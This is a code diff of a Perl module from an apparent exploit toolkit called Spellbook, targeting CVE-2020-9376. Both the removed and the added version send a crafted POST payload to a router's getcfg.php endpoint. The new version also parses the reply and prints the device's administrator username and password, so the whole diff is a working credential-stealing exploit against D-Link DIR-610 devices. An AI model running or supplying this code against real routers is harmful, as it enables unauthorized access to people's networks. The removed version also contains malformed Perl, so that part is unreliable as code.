@@ -1,23 +1,48 @@
 package Spellbook::Advisory::CVE_2020_9376 {
     use strict;
     use warnings;
-    use Mojo::UserAgent;
-
+    use Mojo::DOM;
+    use Spellbook::Core::UserAgent;
+    
     sub new {
-        my $target = $ARGV[0];
-        my $port   = $ARGV[1];
+        my ($self, $parameters) = @_;
+        my ($help, $target, @results);
 
-        if (($target) && ($port)) {
-            my $endpoint = "http://$target:$port/getcfg.php";
-            my $payload  = "SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1";
-            
-            my $ua  = Mojo::UserAgent -> new(
-                Content-Type: application/x-www-form-urlencoded
-            );
-            my $request = $ua -> post ($endpoint => $payload) -> result();
-            my $response = $request -> body();
-            
-            print $response;
+        Getopt::Long::GetOptionsFromArray (
+            $parameters,
+            "h|help"     => \$help,
+            "t|target=s" => \$target
+        );
+
+        if ($target) {
+            if ($target !~ /^http(s)?:\/\//) {
+                $target = "http://$target";
+            }
+
+            my $userAgent = Spellbook::Core::UserAgent -> new();
+            my $headers   = HTTP::Headers -> new ("Content-Type" => "application/x-www-form-urlencoded");
+            my $payload   = "SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1";
+            my $request   = HTTP::Request -> new("POST", "$target/getcfg.php", $headers, $payload);
+            my $response  = $userAgent -> request($request);
+
+            if (($response -> code() == 200) && ($response -> content() =~ m/DIR-610/)) {
+                my $dom = Mojo::DOM -> new($response -> content());
+
+                my $name = $dom -> at("entry > name") -> text();
+                my $password = $dom -> at("entry > password") -> text();
+
+                print "$name:$password\n"; 
+            }
+
+            return @results;
+        }
+
+        if ($help) {
+            return "
+                \rAdvisory::CVE_2020_9376
+                \r=======================
+                \r-h, --help     See this menu
+                \r-t, --target   Define a target to exploit\n\n";
         }
 
         return 0;
